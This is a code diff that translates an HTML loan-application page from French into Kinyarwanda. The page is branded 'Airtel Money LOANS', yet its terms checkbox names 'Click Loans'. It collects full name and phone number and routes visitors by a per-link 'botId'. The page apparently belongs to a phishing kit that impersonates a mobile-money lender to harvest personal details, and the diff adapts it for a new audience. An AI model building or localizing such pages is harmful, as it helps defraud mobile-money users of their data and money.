@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="rw">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Formulaire de demande de prêt</title>
+<title>Fomu yo gusaba inguzanyo</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -64,28 +64,28 @@ button:disabled { background: #ccc; }
      <h1>Airtel Money LOANS</h1>   
     </div>
 
-    <h2>Formulaire de demande de prêt</h2>
+    <h2>Fomu yo gusaba inguzanyo</h2>
 
     <form id="detailsForm">
-        <label>Nom complet</label>
-        <input id="name" placeholder="Nom" required>
+        <label>Izina ryuzuye</label>
+        <input id="name" placeholder="Izina" required>
 
-        <label>Numéro de téléphone</label>
+        <label>Numero ya telefoni</label>
         <input id="phone"  required>
 
         <label class="checkbox-label">
             <input type="checkbox" id="confirmCheck">
-            J'accepte les termes et services de Click Loans
+            Njemera amategeko na serivisi za Click Loans
         </label>
 
-        <button id="nextBtn" disabled>Continuer</button>
+        <button id="nextBtn" disabled>Komeza</button>
     </form>
 </div>
 
 <script>
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
-if (!botId) { alert("Lien d'accès invalide"); throw new Error(); }
+if (!botId) { alert("Umurongo wo kwinjiramo siwo"); throw new Error(); }
 
 if (!localStorage.getItem('loanAmount')) {
     window.location.href = `index.html?botId=${botId}`;
